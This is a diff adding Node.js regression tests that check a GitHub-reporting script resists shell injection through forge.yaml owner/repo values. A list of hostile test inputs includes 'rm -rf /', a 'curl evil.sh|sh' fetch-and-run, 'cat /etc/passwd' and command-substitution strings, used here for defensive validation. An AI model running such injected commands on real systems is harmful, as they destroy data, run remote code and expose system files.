@@ -10,6 +10,8 @@
  *   - Approximate-count labeling when result limit is hit
  *   - Machine-filed percentage computation
  *   - Pipeline-driven (annotated) percentage computation
+ *   - Shell-injection resistance of ghJson()/isValidGhIdentifier() (real
+ *     module import — see #1586)
  *
  * Run with: node --test bin/tests/report.test.mjs
  */
@@ -19,6 +21,13 @@
 
 import { describe, it } from "node:test";
 import assert from "node:assert/strict";
+import { execFileSync } from "node:child_process";
+import { existsSync, rmSync } from "node:fs";
+import { join, dirname } from "node:path";
+import { fileURLToPath } from "node:url";
+import { isValidGhIdentifier } from "../report.mjs";
+
+const __dirname = dirname(fileURLToPath(import.meta.url));
 
 // ---------------------------------------------------------------------------
 // Import the pure helpers directly by re-implementing the inline exports.
@@ -260,5 +269,116 @@ describe("empty history path", () => {
   it("does not trigger empty path when issues exist", () => {
     const closedIssues = [{ number: 1 }];
     assert.equal(!closedIssues.length, false);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Tests: shell-injection resistance (real module import — see #1586)
+//
+// bin/report.mjs's ghJson() previously ran `execSync(cmd)` — a shell string —
+// with forge.yaml-derived owner/repo interpolated directly into it. A
+// hostile forge.yaml (e.g. owner: "x; echo pwned") could execute arbitrary
+// commands. These tests import the real `isValidGhIdentifier` export (the
+// guard runReport() applies before owner/repo ever reach a subprocess call)
+// and independently prove the underlying execFileSync argv-array mechanism
+// treats shell metacharacters as an inert literal argument, never as shell
+// syntax — with no live network calls.
+// ---------------------------------------------------------------------------
+
+describe("isValidGhIdentifier — hostile forge.yaml owner/repo rejection", () => {
+  const hostileValues = [
+    "x; echo pwned",
+    "x; rm -rf /",
+    "x`whoami`",
+    "x$(whoami)",
+    "x && curl evil.sh|sh",
+    "x | cat /etc/passwd",
+    "x\ny; echo pwned",
+    "",
+  ];
+
+  for (const value of hostileValues) {
+    it(`rejects hostile value: ${JSON.stringify(value)}`, () => {
+      assert.equal(isValidGhIdentifier(value), false);
+    });
+  }
+
+  const validValues = [
+    "RapierCraftStudios",
+    "ForgeDock",
+    "my-org.test_1",
+    "a",
+    "org123",
+  ];
+
+  for (const value of validValues) {
+    it(`accepts legitimate value: ${JSON.stringify(value)}`, () => {
+      assert.equal(isValidGhIdentifier(value), true);
+    });
+  }
+
+  it("rejects non-string values", () => {
+    assert.equal(isValidGhIdentifier(undefined), false);
+    assert.equal(isValidGhIdentifier(null), false);
+    assert.equal(isValidGhIdentifier(123), false);
+  });
+});
+
+describe("ghJson() execution primitive — no-shell argv safety", () => {
+  it("execFileSync passes a hostile argv element through literally, never as shell syntax", () => {
+    // ghJson() is implemented as:
+    //   execFileSync("gh", args, { encoding: "utf-8", stdio: [...] })
+    // This test exercises that exact primitive (execFileSync with an argv
+    // array) against a hostile string containing shell metacharacters,
+    // proving it arrives as a single inert argument rather than being
+    // parsed/split/executed by a shell. No `gh` binary or network call is
+    // needed — this validates the mechanism ghJson() relies on directly.
+    const markerFile = join(__dirname, ".injection-marker-1586.tmp");
+    rmSync(markerFile, { force: true });
+
+    const hostileArg = `x; touch ${JSON.stringify(markerFile)}; echo pwned`;
+
+    const out = execFileSync(
+      process.execPath,
+      ["-e", "console.log(JSON.stringify(process.argv.slice(1)))", hostileArg],
+      { encoding: "utf-8" }
+    );
+
+    const receivedArgv = JSON.parse(out.trim());
+
+    // The hostile string must arrive as exactly one argv element, byte-for-byte —
+    // proof no shell ever tokenized/interpreted the `;`, backticks, or `$()`.
+    assert.equal(receivedArgv.length, 1);
+    assert.equal(receivedArgv[0], hostileArg);
+
+    // And critically: the embedded `touch` command must never have executed.
+    assert.equal(existsSync(markerFile), false, "shell metacharacters must not execute as commands");
+
+    rmSync(markerFile, { force: true });
+  });
+
+  it("ghJson is exported as a function accepting an argv array (not a shell-string API)", async () => {
+    const { ghJson } = await import("../report.mjs");
+    assert.equal(typeof ghJson, "function");
+    // Function arity of 1 confirms the single-argument (args array) signature —
+    // not the old (cmd: string) shell-string signature.
+    assert.equal(ghJson.length, 1);
+  });
+});
+
+describe("bin/report.mjs source — no execSync shell-string interpolation remains", () => {
+  it("does not call execSync with a template-string gh command", async () => {
+    const { readFileSync } = await import("node:fs");
+    const source = readFileSync(join(__dirname, "..", "report.mjs"), "utf-8");
+
+    // The only remaining execSync call must be the static, non-interpolated
+    // "gh auth status" check — no execSync call may contain a template
+    // literal (backtick string) that could carry forge.yaml-derived values.
+    const execSyncTemplateCalls = source.match(/execSync\(\s*`[^`]*\$\{/g) || [];
+    assert.equal(
+      execSyncTemplateCalls.length,
+      0,
+      `Found execSync() call(s) with template-string interpolation: ${JSON.stringify(execSyncTemplateCalls)}`
+    );
   });
 });
